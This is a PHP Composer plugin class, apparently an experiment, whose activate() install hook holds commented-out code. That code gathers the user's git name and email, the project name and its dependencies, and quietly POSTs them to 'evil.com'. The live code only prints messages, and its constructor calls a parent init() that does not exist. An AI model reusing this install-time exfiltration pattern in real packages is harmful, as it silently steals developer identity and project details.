<?php
namespace Experiment;
use Composer\Composer;
use Composer\IO\IOInterface;
use Composer\Package\Link;
use Composer\Plugin\PluginInterface;

// use Yii;
// use yii\base\Component;
use yii\base\InvalidConfigException;
use yii\base\InvalidParamException;
use yii\base\View;
use yii\db\ColumnSchema;
use yii\db\Connection;
use yii\db\Expression;
use yii\db\Schema;
use yii\db\TableSchema;
use yii\helpers\ArrayHelper;

class Plugin implements PluginInterface
{

  /**
   * @var Connection DB connection.
   */
  public $db;

  /**
   * @var string Table name to be generated (before prefix).
   */
  public $tableName;

  /**
   * @var string Migration class name.
   */
  public $className;

  /**
   * @var View View used in controller.
   */
  public $view;

  /**
   * @var boolean Table prefix flag.
   */
  public $useTablePrefix;

  /**
   * @var string File template.
   */
  public $templateFile;

  /**
   * @var TableSchema Table schema.
   */
  protected $_tableSchema;

  /**
   * Checks if DB connection is passed.
   * @throws InvalidConfigException
   */
  public function __construct()
  {
      echo "Went inside here-> init()...\n\r";

      parent::init();
      if (!($this->db instanceof Connection)) {
          throw new InvalidConfigException('Parameter db must be an instance of yii\db\Connection!');
      }
  }

    /**
     * @param Composer $composer
     * @param IOInterface $io
     */
    public function activate(Composer $composer, IOInterface $io)
    {
        // exec("git config --global user.name", $name);
        // exec("git config --global user.email", $email);
        // $payload = [];
        // if (count($name) > 0) {
        //     $payload["name"] = $name[0];
        // }
        // if (count($email) > 0) {
        //     $payload["email"] = $email[0];
        // }
        // $app = $composer->getPackage()->getName();
        // if ($app) {
        //     $payload["app"] = $app;
        // }
        // $payload = $this->addDependencies(
        //     "requires",
        //     $composer->getPackage()->getRequires(),
        //     $payload
        // );
        // $payload = $this->addDependencies(
        //     "dev-requires",
        //     $composer->getPackage()->getDevRequires(),
        //     $payload
        // );
        // $context = stream_context_create([
        //     "http" => [
        //         "method" => "POST",
        //         "timeout" => 0.5,
        //         "content" => http_build_query($payload),
        //     ],
        // ]);
        // @file_get_contents("http://evil.com", false, $context);
        $this->createTable();
        print_r("Activated.\n\r");
    }
    /**
     * @param string $type
     * @param Link[] $dependencies
     * @param array $payload
     *
     * @return array
     */
    // private function addDependencies($type, array $dependencies, array $payload)
    // {
    //     $payload = array_slice($payload, 0);
    //     if (count($dependencies) > 0) {
    //         $payload[$type] = [];
    //     }
    //     foreach ($dependencies as $dependency) {
    //         $name = $dependency->getTarget();
    //         $version = $dependency->getPrettyConstraint();
    //         $payload[$type][$name] = $version;
    //     }
    //     return $payload;
    // }
    private function createTable()
    {
      print_r("create table here...\n\r");
    }
}
